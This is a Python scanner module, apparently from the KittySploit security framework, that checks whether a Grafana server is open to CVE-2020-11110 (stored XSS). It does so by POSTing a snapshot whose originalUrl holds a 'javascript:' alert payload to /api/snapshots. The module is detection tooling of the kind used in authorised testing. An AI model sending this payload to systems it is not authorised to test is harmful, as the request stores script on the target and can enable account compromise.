#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Grafana through 6."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Grafana <= 6.7.1 - Cross-Site Scripting Detection',
        'description': 'Grafana through 6.7.1 contains an unauthenticated stored cross-site scripting vulnerability due to insufficient input protection in the originalUrl field, which allows an attacker to inject JavaScript code that will be executed after clicking on Open Original Dashboard after visiting the snapshot.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2020', 'cve', 'xss', 'grafana', 'hackerone', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/grafana/grafana/pull/23254',
            'https://security.netapp.com/advisory/ntap-20200810-0002/',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-11110',
            'https://hackerone.com/reports/1329433',
            'https://github.com/grafana/grafana/blob/master/CHANGELOG.md',
        ],
        'cve': 'CVE-2020-11110',
    }

    def run(self):
        path = '/api/snapshots'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': '{{BaseURL}}', 'content-type': 'application/json', 'Connection': 'close'}, data='{"dashboard":{"annotations":{"list":[{"name":"Annotations & Alerts","enable":true,"iconColor":"rgba(0, 211, 255, 1)","type":"dashboard","builtIn":1,"hide":true}]},"editable":true,"gnetId":null,"graphTooltip":0,"id":null,"links":[],"panels":[],"schemaVersion":18,"snapshot":{"originalUrl":"javascript:alert(\'Revers3c\')","timestamp":"2020-03-30T01:24:44.529Z"},"style":"dark","tags":[],"templating":{"list":[]},"time":{"from":null,"to":"2020-03-30T01:24:53.549Z","raw":{"from":"6h","to":"now"}},"timepicker":{"refresh_intervals":["5s","10s","30s","1m","5m","15m","30m","1h","2h","1d"],"time_options":["5m","15m","1h","6h","12h","24h","2d","7d","30d"]},"timezone":"","title":"Dashboard","uid":null,"version":0},"name":"Dashboard","expires":0}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('"deleteKey":', '"deleteUrl":',)
        header_any = ('application/json',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='Grafana <= 6.7.1 - Cross-Site Scripting detected', path=path)
            return True
        return False

